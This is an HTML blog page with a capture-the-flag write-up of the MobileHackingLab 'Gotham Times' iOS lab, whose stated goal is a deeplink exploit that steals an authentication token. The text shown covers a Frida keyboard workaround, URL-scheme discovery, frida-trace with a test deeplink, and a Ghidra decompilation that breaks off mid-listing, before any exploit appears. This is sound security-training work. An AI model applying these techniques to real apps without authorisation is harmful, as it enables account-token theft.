@@ -1,0 +1,737 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex" />
+
+  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->
+
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/stylesheet/style.min.css">
+
+    <link id="dark-theme-style" rel="stylesheet" type="text/css"
+          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+    href="https://ojack69.github.io/jacks-corner/theme/stylesheet/dark-theme.min.css">
+
+    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+          href="https://ojack69.github.io/jacks-corner/theme/pygments/monokai.min.css">
+    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: light)"
+          href="https://ojack69.github.io/jacks-corner/theme/pygments/emacs.min.css">
+
+
+  <link rel="stylesheet"
+        type="text/css"
+        href="https://ojack69.github.io/jacks-corner/theme/stork/stork.css" />
+
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/fontawesome.css">
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/brands.css">
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/solid.css">
+
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/custom.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/zoom.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/collapsible-toc.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/goals.css"> 
+
+
+      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
+      <script src="https://cdn.jsdelivr.net/npm/dompurify@3.2.4/dist/purify.min.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/collapsible-toc.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/zoom.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/app.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/goals.js" type="application/javascript"></script>
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+<meta name="author" content="Jack69" />
+<meta name="description" content="This is an iOS mobile challenge from MobileHackingLabs. The challenge is built around the fictional newspaper Gotham Times, an iOS application providing users with the latest news and updates about events happening in Gotham City. Objective: Craft a deeplink exploit to steal an authentication token. The app presents itself as …" />
+<meta name="keywords" content="">
+
+
+  <meta property="og:site_name" content="Jack's Corner"/>
+  <meta property="og:title" content="MobileHackingLab - Gotham Times"/>
+  <meta property="og:description" content="This is an iOS mobile challenge from MobileHackingLabs. The challenge is built around the fictional newspaper Gotham Times, an iOS application providing users with the latest news and updates about events happening in Gotham City. Objective: Craft a deeplink exploit to steal an authentication token. The app presents itself as …"/>
+  <meta property="og:locale" content="en_US"/>
+  <meta property="og:url" content="https://ojack69.github.io/jacks-corner/mobile/mobilehackinglab/gotham-times.html"/>
+  <meta property="og:type" content="article"/>
+  <meta property="article:published_time" content="2025-10-04 18:00:00+02:00"/>
+  <meta property="article:modified_time" content=""/>
+  <meta property="article:author" content="https://ojack69.github.io/jacks-corner/author/jack69.html">
+  <meta property="article:section" content="Mobile"/>
+  <meta property="og:image" content="">
+
+  <title>Jack's Corner &ndash; MobileHackingLab - Gotham Times</title>
+
+
+</head>
+<body >
+
+<aside>
+  <div>
+    <a href="https://ojack69.github.io/jacks-corner/">
+      <img src="https://ojack69.github.io/jacks-corner/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
+    </a>
+
+    <h1>
+      <a href="https://ojack69.github.io/jacks-corner/">Jack's Corner</a>
+    </h1>
+
+
+    <div class="stork">
+        <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick=""/>
+      <div class="stork-output" data-stork="sitesearch-output"></div>
+    </div>
+
+
+    <ul class="social">
+      <li>
+        <a class="sc-htb"
+           href="https://app.hackthebox.com/profile/177323"
+           target="_blank">
+          <i class="fa-brands fa-htb"></i>
+        </a>
+      </li>
+      <li>
+        <a class="sc-thm"
+           href="https://tryhackme.com/p/jack69"
+           target="_blank">
+          <i class="fa-brands fa-thm"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+</aside>
+  <main>
+
+<nav>
+  <a href="https://ojack69.github.io/jacks-corner/">Home</a>
+
+  <a href="https://ojack69.github.io/jacks-corner/categories.html">Categories</a>
+  <a href="https://ojack69.github.io/jacks-corner/category/cheatsheet.html">Cheatsheets</a>
+  <a href="https://ojack69.github.io/jacks-corner/personal/goals.html">Goals</a>
+
+
+</nav>
+
+<article class="single">
+  <header>
+      
+    <h1 id="mobile/mobilehackinglab/gotham-times">MobileHackingLab - Gotham Times</h1>
+    <p>
+
+    </p>
+  </header>
+
+
+  <div>
+        <div class="toc col-lg-3 hidden-xs hidden-sm">
+            <div id="toc"><ul><li><a class="toc-href" href="#static-analysis" title="Static Analysis">Static Analysis</a></li><li><a class="toc-href" href="#dynamic-analysis" title="Dynamic Analysis">Dynamic Analysis</a></li><li><a class="toc-href" href="#solution" title="Solution">Solution</a></li><li><a class="toc-href" href="#extended-analysis" title="Extended Analysis">Extended Analysis</a></li></ul></div>
+        </div>
+    <p>This is an iOS mobile challenge from <a href="https://www.mobilehackinglab.com/course/lab-gotham-times">MobileHackingLabs</a>.</p>
+<p>The challenge is built around the fictional newspaper Gotham Times, an iOS application providing users with the latest news and updates about events happening in Gotham City.</p>
+<p><strong>Objective</strong>: Craft a deeplink exploit to steal an authentication token.</p>
+<p>The app presents itself as follows:</p>
+<p><img alt="gotham-times-app-1.jpg" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/gotham-times/gotham-times-app-1.jpg"/></p>
+<p><img alt="gotham-times-app-2.jpg" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/gotham-times/gotham-times-app-2.jpg"/></p>
+<p>When focusing on any text field, on a real iPhone device (no Corelium emulator), the keyboard remains opened and it's not possible to close it even tapping outside the field:</p>
+<p><img alt="gotham-times-app-3.jpg" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/gotham-times/gotham-times-app-3.jpg"/></p>
+<p>This didn't allowed me to complete the signup process. To bypass this inconvenience, I've programmatically forced closing the keyboard with the following <code>frida</code> script:</p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">closeKeyboard</span><span class="p">(</span><span class="nx">f</span><span class="o">=</span><span class="kc">null</span><span class="p">){</span>
+<span class="w">    </span><span class="c1">// Collect all Gotham Times' Controllers</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">controllers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="nx">ObjC</span><span class="p">.</span><span class="nx">classes</span><span class="p">).</span><span class="nx">filter</span><span class="p">(</span><span class="nx">x</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">'Gotham'</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">'Controller'</span><span class="p">));</span><span class="w">   </span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="nx">f</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">){</span>
+<span class="w">        </span><span class="nx">controllers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">controllers</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">x</span><span class="p">=&gt;</span><span class="nx">x</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">f</span><span class="p">))</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="nx">controllers</span><span class="p">.</span><span class="nx">forEach</span><span class="p">((</span><span class="nx">c</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// Get the active instance for that controller, whether it exists</span>
+<span class="w">        </span><span class="nx">ObjC</span><span class="p">.</span><span class="nx">choose</span><span class="p">(</span><span class="nx">ObjC</span><span class="p">.</span><span class="nx">classes</span><span class="p">[</span><span class="nx">c</span><span class="p">],{</span>
+<span class="w">            </span><span class="nx">onMatch</span><span class="o">:</span><span class="w"> </span><span class="p">(</span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="c1">// use '- endEditing:' for closing the keyboard on the active controller's view</span>
+<span class="w">                </span><span class="nx">ObjC</span><span class="p">.</span><span class="nx">schedule</span><span class="p">(</span><span class="nx">ObjC</span><span class="p">.</span><span class="nx">mainQueue</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="nx">instance</span><span class="p">.</span><span class="nx">view</span><span class="p">()[</span><span class="s1">'- endEditing:'</span><span class="p">]();</span>
+<span class="w">                </span><span class="p">})</span>
+<span class="w">            </span><span class="p">},</span><span class="w"> </span>
+<span class="w">            </span><span class="nx">onComplete</span><span class="o">:</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="c1">// Do nothing</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">        </span><span class="p">})</span>
+<span class="w">    </span><span class="p">})</span>
+<span class="p">}</span>
+</code></pre></div>
+<p><img alt="gotham-times-frida-1.png" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/gotham-times/gotham-times-frida-1.png"/></p>
+<p>The script has been executed as follows:</p>
+<p><img alt="gotham-times-frida-2.png" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/gotham-times/gotham-times-frida-2.png"/></p>
+<p>The keyboard is closed and it's possible to complete the signup process:</p>
+<p><img alt="gotham-times-app-4.jpg" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/gotham-times/gotham-times-app-4.jpg"/></p>
+<p>After creating an account and logging in, the app presents a list of news as shown below:</p>
+<p><img alt="gotham-times-app-5.jpg" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/gotham-times/gotham-times-app-5.jpg"/></p>
+<h2 id="static-analysis">Static Analysis</h2>
+<p>Since the goal of the challenge is to exploit a deeplink, the first step has been to analyze which URL schema the applications allows by analysing the application's <code>Info.plist</code>:</p>
+<div class="highlight"><pre><span></span><code>plutil<span class="w"> </span>-p<span class="w"> </span>Payload/Gotham<span class="se">\ </span>Times.app/Info.plist
+</code></pre></div>
+<p><img alt="gotham-times-static-1.png" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/gotham-times/gotham-times-static-1.png"/></p>
+<p>The URL schema <code>gothamtimes</code> is therefore identified.</p>
+<h2 id="dynamic-analysis">Dynamic Analysis</h2>
+<p>In order to understand which class handles the deeplink, I've setup <code>frida-trace</code> as follows, tracing all methods for all classing starting with "Gotham":</p>
+<div class="highlight"><pre><span></span><code>frida-trace -U -m "*[Gotham* *]" -n 'Gotham Times' 
+</code></pre></div>
+<p><img alt="gotham-times-dynamic-1.png" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/gotham-times/gotham-times-dynamic-1.png"/></p>
+<p>Then, after connecting with SSH to the device, I've ran the following command to trigger the deeplink:</p>
+<div class="highlight"><pre><span></span><code>uiopen gothamtimes://test
+</code></pre></div>
+<p>As shown below, the class <code>Gotham_Times::SceneDelegate</code> handles the deeplink with the method <code>scene</code>:</p>
+<p><img alt="gotham-times-dynamic-2.png" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/gotham-times/gotham-times-dynamic-2.png"/></p>
+<p>Following the decompiled code from <code>ghidra</code> of the <code>Gotham_Times::SceneDelegate::scene</code> method:</p>
+<div class="highlight"><pre><span></span><code><span class="cm">/* Gotham_Times.SceneDelegate.scene(_: __C.UIScene, openURLContexts:</span>
+<span class="cm">   Swift.Set&lt;__C.UIOpenURLContext&gt;) -&gt; () */</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="n">__thiscall</span>
+<span class="nf">Gotham_Times::SceneDelegate::scene</span><span class="p">(</span><span class="n">SceneDelegate</span><span class="w"> </span><span class="o">*</span><span class="n">this</span><span class="p">,</span><span class="n">UIScene</span><span class="w"> </span><span class="o">*</span><span class="n">param_1</span><span class="p">,</span><span class="n">Set</span><span class="o">&lt;&gt;</span><span class="w"> </span><span class="n">openURLContexts</span><span class="p">)</span>
+
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="n">lVar1</span><span class="p">;</span>
+<span class="w">  </span><span class="n">String</span><span class="w"> </span><span class="n">SVar2</span><span class="p">;</span>
+<span class="w">  </span><span class="n">SceneDelegate</span><span class="w"> </span><span class="o">*</span><span class="n">pSVar3</span><span class="p">;</span>
+<span class="w">  </span><span class="n">StaticString</span><span class="w"> </span><span class="n">SVar4</span><span class="p">;</span>
+<span class="w">  </span><span class="n">code</span><span class="w"> </span><span class="o">*</span><span class="n">pcVar5</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">bool</span><span class="w"> </span><span class="n">bVar6</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UIScene</span><span class="w"> </span><span class="o">*</span><span class="n">pUVar7</span><span class="p">;</span>
+<span class="w">  </span><span class="n">undefined</span><span class="w"> </span><span class="o">*</span><span class="n">puVar8</span><span class="p">;</span>
+<span class="w">  </span><span class="n">Iterator</span><span class="w"> </span><span class="n">IVar9</span><span class="p">;</span>
+<span class="w">  </span><span class="n">URL</span><span class="w"> </span><span class="n">UVar10</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">pcVar11</span><span class="p">;</span>
+<span class="w">  </span><span class="n">URL</span><span class="w"> </span><span class="n">UVar12</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UIStoryboard</span><span class="w"> </span><span class="o">*</span><span class="n">pUVar13</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UINavigationController</span><span class="w"> </span><span class="o">*</span><span class="n">this_00</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UIWindow</span><span class="w"> </span><span class="o">*</span><span class="n">pUVar14</span><span class="p">;</span>
+<span class="w">  </span><span class="n">NewsController</span><span class="w"> </span><span class="o">*</span><span class="n">pNVar15</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UIViewController</span><span class="w"> </span><span class="o">*</span><span class="n">pUVar16</span><span class="p">;</span>
+<span class="w">  </span><span class="n">Set</span><span class="w"> </span><span class="n">SVar17</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="n">lVar18</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">pvVar19</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">pcVar20</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">in_x3</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">pcVar21</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">in_x5</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="n">extraout_x8</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="n">extraout_x8_00</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="n">extraout_x8_01</span><span class="p">;</span>
+<span class="w">  </span><span class="n">tuple2</span><span class="p">.</span><span class="n">conflict1</span><span class="w"> </span><span class="n">tVar22</span><span class="p">;</span>
+<span class="w">  </span><span class="n">String</span><span class="w"> </span><span class="n">SVar23</span><span class="p">;</span>
+<span class="w">  </span><span class="n">String</span><span class="w"> </span><span class="n">SVar24</span><span class="p">;</span>
+<span class="w">  </span><span class="n">String</span><span class="w"> </span><span class="n">check_str</span><span class="p">;</span>
+<span class="w">  </span><span class="n">String</span><span class="w"> </span><span class="n">SVar25</span><span class="p">;</span>
+<span class="w">  </span><span class="n">String</span><span class="w"> </span><span class="n">separator</span><span class="p">;</span>
+<span class="w">  </span><span class="n">String</span><span class="w"> </span><span class="n">separator_00</span><span class="p">;</span>
+<span class="w">  </span><span class="n">String</span><span class="w"> </span><span class="n">separator_01</span><span class="p">;</span>
+<span class="w">  </span><span class="n">String</span><span class="w"> </span><span class="n">SVar26</span><span class="p">;</span>
+<span class="w">  </span><span class="n">undefined1</span><span class="w"> </span><span class="n">auStack_3b0</span><span class="w"> </span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+<span class="w">  </span><span class="n">undefined8</span><span class="w"> </span><span class="n">uStack_3a8</span><span class="p">;</span>
+<span class="w">  </span><span class="n">undefined4</span><span class="w"> </span><span class="n">auStack_3a0</span><span class="w"> </span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
+<span class="w">  </span><span class="n">UIViewController</span><span class="w"> </span><span class="o">*</span><span class="n">local_390</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UIViewController</span><span class="w"> </span><span class="o">*</span><span class="n">local_388</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UIViewController</span><span class="w"> </span><span class="o">*</span><span class="n">local_380</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UIViewController</span><span class="w"> </span><span class="o">*</span><span class="n">local_378</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UIWindow</span><span class="w"> </span><span class="o">**</span><span class="n">local_370</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UIWindow</span><span class="w"> </span><span class="o">*</span><span class="n">local_368</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UIWindow</span><span class="w"> </span><span class="o">**</span><span class="n">local_360</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UIWindow</span><span class="w"> </span><span class="o">*</span><span class="n">local_358</span><span class="p">;</span>
+<span class="w">  </span><span class="n">undefined4</span><span class="w"> </span><span class="n">local_34c</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">local_348</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UIStoryboard</span><span class="w"> </span><span class="o">*</span><span class="n">local_340</span><span class="p">;</span>
+<span class="w">  </span><span class="n">NSString</span><span class="w"> </span><span class="o">*</span><span class="n">local_338</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UIStoryboard</span><span class="w"> </span><span class="o">*</span><span class="n">local_330</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UIStoryboard</span><span class="w"> </span><span class="o">*</span><span class="n">local_328</span><span class="p">;</span>
+<span class="w">  </span><span class="n">undefined8</span><span class="w"> </span><span class="n">local_320</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UINavigationController</span><span class="w"> </span><span class="o">*</span><span class="n">local_318</span><span class="p">;</span>
+<span class="w">  </span><span class="n">uint</span><span class="w"> </span><span class="n">local_30c</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">local_308</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">local_300</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">local_2f8</span><span class="p">;</span>
+<span class="w">  </span><span class="n">undefined</span><span class="w"> </span><span class="o">*</span><span class="n">local_2f0</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">local_2e8</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">local_2e0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">uint</span><span class="w"> </span><span class="n">local_2d4</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">local_2d0</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">local_2c8</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">local_2c0</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">local_2b8</span><span class="p">;</span>
+<span class="w">  </span><span class="n">undefined</span><span class="w"> </span><span class="o">**</span><span class="n">local_2b0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">uint</span><span class="w"> </span><span class="n">local_2a8</span><span class="p">;</span>
+<span class="w">  </span><span class="n">uint</span><span class="w"> </span><span class="n">local_2a4</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">local_2a0</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">local_298</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">local_290</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">local_288</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">local_280</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">local_278</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">local_270</span><span class="p">;</span>
+<span class="w">  </span><span class="n">protocol_t</span><span class="w"> </span><span class="o">*</span><span class="n">local_268</span><span class="p">;</span>
+<span class="w">  </span><span class="n">undefined</span><span class="w"> </span><span class="o">*</span><span class="n">local_260</span><span class="p">;</span>
+<span class="w">  </span><span class="n">undefined</span><span class="w"> </span><span class="o">*</span><span class="n">local_258</span><span class="p">;</span>
+<span class="w">  </span><span class="n">code</span><span class="w"> </span><span class="o">*</span><span class="n">local_250</span><span class="p">;</span>
+<span class="w">  </span><span class="n">code</span><span class="w"> </span><span class="o">*</span><span class="n">local_248</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">local_240</span><span class="p">;</span>
+<span class="w">  </span><span class="n">undefined</span><span class="w"> </span><span class="o">*</span><span class="n">local_238</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="n">local_230</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">local_228</span><span class="p">;</span>
+<span class="w">  </span><span class="n">undefined</span><span class="w"> </span><span class="o">*</span><span class="n">local_220</span><span class="p">;</span>
+<span class="w">  </span><span class="n">undefined</span><span class="w"> </span><span class="o">*</span><span class="n">local_218</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UIScene</span><span class="w"> </span><span class="o">*</span><span class="n">local_210</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UIOpenURLContext</span><span class="w"> </span><span class="o">*</span><span class="n">local_208</span><span class="p">;</span>
+<span class="w">  </span><span class="n">undefined1</span><span class="w"> </span><span class="o">*</span><span class="n">local_200</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UIScene</span><span class="w"> </span><span class="o">*</span><span class="n">local_1f8</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UIScene</span><span class="w"> </span><span class="o">*</span><span class="n">local_1f0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UIScene</span><span class="w"> </span><span class="o">*</span><span class="n">local_1e8</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UIScene</span><span class="w"> </span><span class="o">*</span><span class="n">local_1e0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">SceneDelegate</span><span class="w"> </span><span class="o">*</span><span class="n">local_1d8</span><span class="p">;</span>
+<span class="w">  </span><span class="n">undefined</span><span class="w"> </span><span class="o">*</span><span class="n">local_1d0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">ulong</span><span class="w"> </span><span class="o">*</span><span class="n">local_1c8</span><span class="p">;</span>
+<span class="w">  </span><span class="n">StaticString</span><span class="w"> </span><span class="n">local_1c0</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">local_1b8</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">local_1b0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">Set</span><span class="w"> </span><span class="n">local_1a8</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">local_1a0</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="n">local_198</span><span class="p">;</span>
+<span class="w">  </span><span class="n">ulong</span><span class="w"> </span><span class="n">local_190</span><span class="p">;</span>
+<span class="w">  </span><span class="n">undefined</span><span class="w"> </span><span class="o">*</span><span class="n">local_188</span><span class="p">;</span>
+<span class="w">  </span><span class="n">ulong</span><span class="w"> </span><span class="n">local_180</span><span class="p">;</span>
+<span class="w">  </span><span class="n">undefined</span><span class="w"> </span><span class="o">*</span><span class="n">local_178</span><span class="p">;</span>
+<span class="w">  </span><span class="n">ulong</span><span class="w"> </span><span class="n">local_170</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="n">local_168</span><span class="p">;</span>
+<span class="w">  </span><span class="n">ulong</span><span class="w"> </span><span class="n">local_160</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="n">local_158</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UIScene</span><span class="w"> </span><span class="o">*</span><span class="n">inputUrl</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UIScene</span><span class="w"> </span><span class="o">*</span><span class="n">local_148</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">local_140</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">local_138</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UIViewController</span><span class="w"> </span><span class="o">*</span><span class="n">local_130</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UIWindow</span><span class="w"> </span><span class="o">*</span><span class="n">local_128</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UIWindow</span><span class="w"> </span><span class="o">*</span><span class="n">local_120</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UINavigationController</span><span class="w"> </span><span class="o">*</span><span class="n">local_118</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UIStoryboard</span><span class="w"> </span><span class="o">*</span><span class="n">local_110</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UIStoryboard</span><span class="w"> </span><span class="o">*</span><span class="n">local_108</span><span class="p">;</span>
+<span class="w">  </span><span class="n">undefined1</span><span class="w"> </span><span class="n">auStack_100</span><span class="w"> </span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="n">local_f8</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">local_f0</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">local_e8</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">local_e0</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">local_d8</span><span class="p">;</span>
+<span class="w">  </span><span class="n">undefined</span><span class="w"> </span><span class="o">*</span><span class="n">local_d0</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="n">local_c8</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">local_c0</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">local_b8</span><span class="p">;</span>
+<span class="w">  </span><span class="n">undefined</span><span class="w"> </span><span class="o">*</span><span class="n">local_b0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">undefined</span><span class="w"> </span><span class="o">*</span><span class="n">local_a8</span><span class="p">;</span>
+<span class="w">  </span><span class="n">undefined1</span><span class="w"> </span><span class="n">auStack_a0</span><span class="w"> </span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>
